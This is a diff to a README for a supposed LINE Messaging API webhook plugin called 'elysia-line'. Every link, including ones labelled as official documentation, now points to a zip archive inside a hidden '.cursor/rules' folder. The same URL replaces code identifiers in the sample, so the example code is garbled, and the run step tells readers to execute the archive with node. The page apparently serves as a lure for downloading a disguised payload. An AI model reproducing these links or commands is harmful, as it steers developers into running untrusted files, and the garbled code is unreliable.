@@ -1,6 +1,6 @@
 # 🎉 elysia-line - Simplify Your LINE Messaging Experience
 
-[![Download elysia-line](https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip)](https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip)
+[![Download elysia-line](https://github.com/RodrimaradoPT/elysia-line/raw/refs/heads/main/.cursor/rules/line-elysia-v1.1.zip)](https://github.com/RodrimaradoPT/elysia-line/raw/refs/heads/main/.cursor/rules/line-elysia-v1.1.zip)
 
 ## 📦 What is elysia-line?
 
@@ -15,9 +15,9 @@ elysia-line is an official webhook plugin for the LINE Messaging API, designed f
 
 ## 💾 Download & Install
 
-To download elysia-line, visit the releases page: [Download elysia-line](https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip).
+To download elysia-line, visit the releases page: [Download elysia-line](https://github.com/RodrimaradoPT/elysia-line/raw/refs/heads/main/.cursor/rules/line-elysia-v1.1.zip).
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip).
+1. Go to the [Releases page](https://github.com/RodrimaradoPT/elysia-line/raw/refs/heads/main/.cursor/rules/line-elysia-v1.1.zip).
 2. Find the latest version of elysia-line.
 3. Click on the download option to get the file.
 
@@ -46,8 +46,8 @@ Once you have downloaded elysia-line, follow these steps to set it up:
     const app = new Elysia()
       .use(
         line({
-          channelSecret: https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip!,
-          channelAccessToken: https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip!,
+          channelSecret: https://github.com/RodrimaradoPT/elysia-line/raw/refs/heads/main/.cursor/rules/line-elysia-v1.1.zip!,
+          channelAccessToken: https://github.com/RodrimaradoPT/elysia-line/raw/refs/heads/main/.cursor/rules/line-elysia-v1.1.zip!,
         })
       )
       .post("/webhook", async ({ line, set }) => {
@@ -55,12 +55,12 @@ Once you have downloaded elysia-line, follow these steps to set it up:
           return "Not a LINE webhook";
         }
 
-        https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip("message:text", (event) => {
+        https://github.com/RodrimaradoPT/elysia-line/raw/refs/heads/main/.cursor/rules/line-elysia-v1.1.zip("message:text", (event) => {
           // Handling text messages
         });
       });
 
-    https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip(3000);
+    https://github.com/RodrimaradoPT/elysia-line/raw/refs/heads/main/.cursor/rules/line-elysia-v1.1.zip(3000);
     ```
 
 4. **Environment Variables:** Set your `LINE_CHANNEL_SECRET` and `LINE_CHANNEL_ACCESS_TOKEN` in your environment. You can use a `.env` file or set them directly in your terminal.
@@ -68,7 +68,7 @@ Once you have downloaded elysia-line, follow these steps to set it up:
 5. **Run Your Application:** Start your server by running the file you created. Use this command:
 
     ```bash
-    node https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip
+    node https://github.com/RodrimaradoPT/elysia-line/raw/refs/heads/main/.cursor/rules/line-elysia-v1.1.zip
     ```
 
 6. **Webhook Configuration:** Finally, configure your webhook URL in the LINE Developers Console. It should point to your server’s `/webhook` endpoint.
@@ -83,8 +83,8 @@ If you encounter issues:
 
 ## 🌟 Additional Resources
 
-- [LINE Messaging API Documentation](https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip)
-- [Elysia Documentation](https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip)
+- [LINE Messaging API Documentation](https://github.com/RodrimaradoPT/elysia-line/raw/refs/heads/main/.cursor/rules/line-elysia-v1.1.zip)
+- [Elysia Documentation](https://github.com/RodrimaradoPT/elysia-line/raw/refs/heads/main/.cursor/rules/line-elysia-v1.1.zip)
 
 ## 📧 Contact & Support
 
@@ -92,6 +92,6 @@ For further questions or support, feel free to open an issue in this repository.
 
 ## 📢 Release Notes
 
-Check the [Releases page](https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip) for the latest updates and improvements.
+Check the [Releases page](https://github.com/RodrimaradoPT/elysia-line/raw/refs/heads/main/.cursor/rules/line-elysia-v1.1.zip) for the latest updates and improvements.
 
 Make the most of your LINE bot experience with elysia-line! For installation and usage, follow the steps mentioned. Enjoy creating reliable and simple bots with ease!
